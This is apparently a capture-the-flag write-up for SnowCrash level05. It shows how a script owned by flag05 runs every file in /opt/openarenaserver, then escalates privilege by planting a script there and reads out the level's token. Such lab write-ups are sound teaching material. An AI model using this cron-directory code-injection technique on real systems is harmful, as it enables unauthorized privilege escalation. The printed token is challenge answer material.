1. **Searching for files**

    Using the `find` command, we found a file for the user `flag05`:
    ```bash
    level05@SnowCrash:~$ find / -user flag05 2>/dev/null
    /usr/sbin/openarenaserver
    level05@SnowCrash:~$ file /rofs/usr/sbin/openarenaserver 
    /rofs/usr/sbin/openarenaserver: regular file, no read permission
    level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver 
    -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
    ```
    Permissions: -rwxr-x---+
    The `+` sign at the end of the permissions in `ls -la` indicates that the file has additional ACLs configured beyond the standard permissions.

2. **Checking ACLs**

    ```bash
    level05@SnowCrash:~$ getfacl /usr/sbin/openarenaserver 
    getfacl: Removing leading '/' from absolute path names
    # file: usr/sbin/openarenaserver
    # owner: flag05
    # group: flag05
    user::rwx
    user:level05:r--
    group::r-x
    mask::r-x
    other::---
    ``` 
    When you see `user:level05:r--` in the output of `getfacl`, it means that the user level05 has been specifically granted read permission for the file, even though the standard permissions would not allow it.

3. **Exploitation**

    Let's try to see what this file does.
    ```bash
    level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done
    ```
    This script:
    Iterates through all files in the directory `/opt/openarenaserver/`
    For each file:
    - Sets a time execution limit of 5 seconds `(ulimit -t 5)`
    - Executes the file as a bash script in debug mode `(bash -x)`
    - Deletes the file after execution `(rm -f)`

    This suggests that there might be a Cron job that executes all files inside this folder. To exploit this, we will create a malicious script that runs `getflag`:
    ```bash
    echo "getflag > /tmp/flag05" > /opt/openarenaserver/exploit.sh
    chmod +x /opt/openarenaserver/exploit.sh
    ``` 
    We wait for the cron job to execute and then check the contents of the `flag05` file:
    ```bash
    level05@SnowCrash:~$ cat /tmp/flag05
    Check flag.Here is your token : viuaaale9huek52boumoomioc
    ```
